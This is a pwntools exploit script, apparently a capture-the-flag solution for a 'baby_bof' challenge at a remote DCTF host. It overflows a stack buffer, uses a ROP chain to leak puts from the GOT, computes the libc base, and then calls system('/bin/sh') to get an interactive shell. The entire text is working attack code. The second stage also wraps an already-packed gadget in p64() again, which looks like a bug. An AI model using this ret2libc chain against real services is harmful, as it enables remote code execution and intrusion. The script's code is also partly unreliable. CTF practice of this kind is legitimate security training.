from pwn import *
#s = process('./baby_bof')
s = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)

pop_rdi     = p64(0x00400683)
pop_rsi_r15 = p64(0x00400681)
puts_plt    = p64(0x4004a0)
puts_got    = p64(0x601018)
vuln        = p64(0x4005b7)
ret         = p64(0x0040048e)

# 1st
print(s.recvline())
payload = b'A' * 18
payload += pop_rdi
payload += puts_got 
payload += puts_plt
payload += vuln     # To 2nd
s.sendline(payload)
s.recvline()

# Setting libc addr
data = s.recvline()[:-1]
addr = u64(data.ljust(8, b'\0'))
print(hex(addr))
libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')
libc.address = addr - 0x0875a0


# 2nd
print(s.recvline())
payload = b'A' * 18
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += ret
payload += p64(libc.symbols['system'])
s.sendline(payload)

s.interactive()
